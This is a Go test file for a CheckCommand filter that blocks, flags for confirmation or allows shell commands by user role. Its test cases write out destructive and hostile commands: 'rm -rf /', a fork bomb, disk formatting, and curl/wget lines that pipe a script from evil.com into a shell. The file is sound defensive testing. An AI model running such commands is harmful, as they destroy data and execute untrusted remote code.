package service

import (
	"testing"
)

func TestCheckCommand_DangerousCommands(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		role    string
		blocked bool
		reason  string
	}{
		{"rm -rf /", "rm -rf /", "admin", true, "dangerous_command"},
		{"rm -rf /*", "rm -rf /*", "admin", true, "dangerous_command"},
		{"fork bomb", ":(){:|:&};:", "admin", true, "dangerous_command"},
		{"curl pipe bash", "curl http://evil.com | bash", "admin", true, "dangerous_command"},
		{"wget pipe sh", "wget http://evil.com/script.sh | sh", "admin", true, "dangerous_command"},
		{"mkfs", "mkfs.ext4 /dev/sda1", "admin", true, "dangerous_command"},
		{"fdisk", "fdisk -l /dev/sda", "admin", true, "dangerous_command"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := CheckCommand(tt.input, tt.role)
			if result.Blocked != tt.blocked {
				t.Errorf("CheckCommand() blocked = %v, want %v", result.Blocked, tt.blocked)
			}
			if result.Blocked && result.Reason != tt.reason {
				t.Errorf("CheckCommand() reason = %v, want %v", result.Reason, tt.reason)
			}
		})
	}
}

func TestCheckCommand_SensitiveCommands(t *testing.T) {
	tests := []struct {
		name         string
		input        string
		role         string
		needsConfirm bool
	}{
		{"sudo", "sudo apt install nginx", "admin", true},
		{"reboot", "reboot", "admin", true},
		{"shutdown", "shutdown -h now", "admin", true},
		{"systemctl restart", "systemctl restart nginx", "admin", true},
		{"systemctl stop", "systemctl stop firewalld", "admin", true},
		{"service restart", "service nginx restart", "admin", true},
		{"kill -9", "kill -9 1234", "admin", true},
		{"pkill", "pkill -f node", "admin", true},
		{"iptables", "iptables -A INPUT -p tcp --dport 80 -j ACCEPT", "admin", true},
		{"ufw", "ufw allow 80/tcp", "admin", true},
		{"chmod 777", "chmod 777 /etc/passwd", "admin", true},
		{"chown root", "chown root:root /tmp/file", "admin", true},
		{"case insensitive sudo", "SUDO apt update", "admin", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := CheckCommand(tt.input, tt.role)
			if result.NeedsConfirm != tt.needsConfirm {
				t.Errorf("CheckCommand() needs_confirm = %v, want %v", result.NeedsConfirm, tt.needsConfirm)
			}
			if tt.needsConfirm && result.Command == "" {
				t.Errorf("CheckCommand() command should be set for sensitive commands")
			}
		})
	}
}

func TestCheckCommand_NormalCommands(t *testing.T) {
	tests := []struct {
		name  string
		input string
		role  string
	}{
		{"ls", "ls -la", "admin"},
		{"cd", "cd /tmp", "admin"},
		{"echo", "echo hello", "admin"},
		{"cat", "cat /etc/hosts", "admin"},
		{"ps", "ps aux", "admin"},
		{"top", "top", "admin"},
		{"vim", "vim /tmp/file.txt", "admin"},
		{"git", "git status", "admin"},
		{"docker ps", "docker ps", "admin"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := CheckCommand(tt.input, tt.role)
			if !result.Allowed {
				t.Errorf("CheckCommand() allowed = false, want true for: %s", tt.input)
			}
			if result.Blocked {
				t.Errorf("CheckCommand() blocked = true, want false for: %s", tt.input)
			}
			if result.NeedsConfirm {
				t.Errorf("CheckCommand() needs_confirm = true, want false for: %s", tt.input)
			}
		})
	}
}

func TestCheckCommand_ViewerRole(t *testing.T) {
	tests := []struct {
		name       string
		input      string
		role       string
		allowed    bool
		blocked    bool
		viewerOnly bool
	}{
		{"viewer ls", "ls -la", "viewer", true, false, false},
		{"viewer cat", "cat /etc/hosts", "viewer", true, false, false},
		{"viewer top", "top", "viewer", true, false, false},
		{"viewer ps", "ps aux", "viewer", true, false, false},
		{"viewer df", "df -h", "viewer", true, false, false},
		{"viewer free", "free -m", "viewer", true, false, false},
		{"viewer uptime", "uptime", "viewer", true, false, false},
		{"viewer whoami", "whoami", "viewer", true, false, false},
		{"viewer vim blocked", "vim /etc/passwd", "viewer", false, true, true},
		{"viewer echo blocked", "echo hello", "viewer", false, true, true},
		{"viewer sudo blocked", "sudo apt install", "viewer", false, true, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := CheckCommand(tt.input, tt.role)
			if result.Allowed != tt.allowed {
				t.Errorf("CheckCommand() allowed = %v, want %v for: %s", result.Allowed, tt.allowed, tt.input)
			}
			if result.Blocked != tt.blocked {
				t.Errorf("CheckCommand() blocked = %v, want %v for: %s", result.Blocked, tt.blocked, tt.input)
			}
			if result.ViewerOnly != tt.viewerOnly {
				t.Errorf("CheckCommand() viewer_only = %v, want %v for: %s", result.ViewerOnly, tt.viewerOnly, tt.input)
			}
		})
	}
}

func TestCheckCommand_EmptyInput(t *testing.T) {
	result := CheckCommand("", "admin")
	if !result.Allowed {
		t.Error("CheckCommand() should allow empty input")
	}
}

func TestCheckCommand_WhitespaceOnly(t *testing.T) {
	result := CheckCommand("   \n\t   ", "admin")
	if !result.Allowed {
		t.Error("CheckCommand() should allow whitespace-only input")
	}
}

func TestDangerousCommandsList(t *testing.T) {
	if len(DangerousCommands) == 0 {
		t.Error("DangerousCommands list should not be empty")
	}
}

func TestSensitiveCommandsList(t *testing.T) {
	if len(SensitiveCommands) == 0 {
		t.Error("SensitiveCommands list should not be empty")
	}

	expectedCommands := []string{
		"\\bsudo\\b", "\\breboot\\b", "\\bshutdown\\b",
		"systemctl\\s+(restart|stop|disable|mask|kill)",
		"service\\s+.*\\s+(restart|stop)", "kill\\s+-9",
		"\\bpkill\\b", "\\biptables\\b", "\\bufw\\b",
		"chmod\\s+[0-7]?77[7]", "\\bchown\\s+root",
	}

	for _, expected := range expectedCommands {
		found := false
		for _, actual := range SensitiveCommands {
			if actual == expected {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("SensitiveCommands missing: %s", expected)
		}
	}
}

func TestCheckCommand_CaseInsensitive(t *testing.T) {
	tests := []struct {
		name         string
		input        string
		needsConfirm bool
		blocked      bool
	}{
		{"SUDO uppercase", "SUDO rm /tmp/file", true, false},
		{"Reboot mixed case", "Reboot", true, false},
		{"RM -RF uppercase", "RM -RF /", false, true},
		{"MKFS uppercase", "MKFS /dev/sda", false, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := CheckCommand(tt.input, "admin")
			if result.NeedsConfirm != tt.needsConfirm {
				t.Errorf("CheckCommand() needs_confirm = %v, want %v for: %s", result.NeedsConfirm, tt.needsConfirm, tt.input)
			}
			if result.Blocked != tt.blocked {
				t.Errorf("CheckCommand() blocked = %v, want %v for: %s", result.Blocked, tt.blocked, tt.input)
			}
		})
	}
}
